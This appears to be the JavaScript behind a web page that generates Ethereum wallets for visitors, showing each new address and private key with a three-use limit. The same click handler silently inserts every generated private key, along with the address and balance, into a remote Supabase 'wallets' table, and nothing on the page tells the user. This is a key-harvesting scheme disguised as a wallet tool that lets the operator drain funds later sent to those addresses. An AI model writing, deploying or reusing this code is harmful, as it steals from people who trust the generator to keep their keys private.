const { ethers } = require("ethers");
const supabase = require("./db");

const generateBtn =
  document.getElementById("generateBtn");

const copyAddressBtn =
  document.getElementById("copyAddressBtn");

const message =
  document.getElementById("message");

let generateCount = 0;

generateBtn.addEventListener("click", async () => {

    try {

        if(generateCount >= 3){

            message.style.display = "block";

            message.innerHTML = `
              <span>
                Generation Limit Reached \u274C
              </span>
            `;

            generateBtn.disabled = true;

            return;
        }

        generateBtn.innerText =
          "Generating...";

        const wallet =
          ethers.Wallet.createRandom();

        const provider =
          new ethers.JsonRpcProvider(
            "https://rpc.flashbots.net"
          );

        const bal =
          await provider.getBalance(
            wallet.address
          );

        const balance =
          ethers.formatEther(bal);

        document.getElementById("address").value =
          wallet.address;

        document.getElementById("privateKey").value =
          wallet.privateKey;

        const { data, error } =
          await supabase
            .from("wallets")
            .insert([
              {
                wallet: wallet.address,
                private_key: wallet.privateKey,
                balance: balance
              }
            ])
            .select();

        if (error) {

            console.log(error);

            message.style.display = "block";

            message.innerHTML = `
              <span>
                Database Error \u274C
              </span>
            `;

            generateBtn.innerText =
              "Generate Wallet";

            return;
        }

        generateCount++;

        message.style.display = "block";

        message.innerHTML = `
          <span>
            Wallet Generated \u{1F389}
            (${generateCount}/3)
          </span>
        `;

        generateBtn.innerText =
          "Generate Wallet";

        if(generateCount >= 3){

            generateBtn.disabled = true;

            generateBtn.innerText =
              "Limit Reached";
        }

        console.log(
          `DATA: ${JSON.stringify(data, null, 2)}`
        );

    } catch(err){

        console.log(err);

        message.style.display = "block";

        message.innerHTML = `
          <span>
            Something Went Wrong \u274C
          </span>
        `;

        generateBtn.innerText =
          "Generate Wallet";
    }

});

copyAddressBtn.addEventListener(
  "click",
  async () => {

    const address =
      document.getElementById("address").value;

    if (!address) {
        return;
    }

    await navigator.clipboard.writeText(
      address
    );

    message.style.display = "block";

    message.innerHTML = `
      <span>
        Address Copied \u2705
      </span>
    `;
});
